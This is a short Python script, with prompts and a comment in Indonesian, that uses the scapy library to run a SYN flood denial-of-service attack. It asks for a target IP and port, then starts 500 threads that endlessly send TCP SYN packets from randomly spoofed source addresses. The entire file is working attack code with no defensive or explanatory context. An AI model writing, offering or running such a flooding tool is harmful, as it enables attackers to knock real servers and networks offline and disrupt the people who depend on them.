from scapy.all import *
import random
import threading

target_ip = input("Masukkan IP target: ")
target_port = int(input("Masukkan port target: "))

def syn_flood():
    while True:
        ip = IP(src=RandIP(), dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        send(ip/tcp, verbose=False)

threads = []
for i in range(500):  # Multithreading untuk kecepatan
    thread = threading.Thread(target=syn_flood)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
